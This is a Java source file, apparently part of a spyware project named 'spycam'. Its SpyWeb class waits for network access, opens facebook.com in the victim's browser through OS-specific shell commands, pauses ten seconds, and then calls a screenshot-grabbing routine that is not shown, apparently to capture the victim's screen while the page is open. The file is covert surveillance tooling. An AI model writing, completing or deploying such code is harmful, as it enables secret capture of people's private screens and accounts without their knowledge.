/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package spycam;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 *
 * @author shadman264
 */
public class SpyWeb {

    public static void main(String args[]) throws IOException, InterruptedException {
        SpyShot shot = new SpyShot();
        String url = "http://www.facebook.com";
        String os = System.getProperty("os.name").toLowerCase();
        Runtime rt = Runtime.getRuntime();
        while (true) {
            if (netIsAvailable() == true) {
                try {
                    WebBrowser(url, os, rt);
                    break;
                } catch (Exception e) {

                }

            }
        }
        Thread.sleep(10000);
        shot.ScreenshotGrabber();
        
        return;
    }

    public static void WebBrowser(String url, String os, Runtime rt) {
        try {
            if (os.indexOf("win") >= 0) {
                // this doesn't support showing urls in the form of "page.html#nameLink" 
                rt.exec("rundll32 url.dll,FileProtocolHandler " + url);
            } else if (os.indexOf("mac") >= 0) {
                rt.exec("open " + url);
            } else if (os.indexOf("nix") >= 0 || os.indexOf("nux") >= 0) {
                // Do a best guess on unix until we get a platform independent way
                // Build a list of browsers to try, in this order.
                String[] browsers = {"chrome", "firefox", "mozilla", "epiphany", "konqueror",
                    "netscape", "opera", "links", "lynx"};
                // Build a command string which looks like "browser1 "url" || browser2 "url" ||..."
                StringBuffer cmd = new StringBuffer();
                for (int i = 0; i < browsers.length; i++) {
                    cmd.append((i == 0 ? "" : " || ") + browsers[i] + " \"" + url + "\" ");
                }
                rt.exec(new String[]{"sh", "-c", cmd.toString()});
            } else {
                return;
            }
        } catch (Exception e) {
            return;
        }
        return;
    }

    public static boolean netIsAvailable() throws IOException {
        try {
            try {
                URL url = new URL("http://www.facebook.com");
                System.out.println(url.getHost());
                HttpURLConnection con = (HttpURLConnection) url
                        .openConnection();
                con.connect();
                //System.out.println("THE RESPONSE CODE IS " + con.getResponseCode());
                if (con.getResponseCode() == 302) {
                    System.out.println("Connection established!!");
                    return true;
                }
            } catch (Exception exception) {
                System.out.println("No Connection");
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}
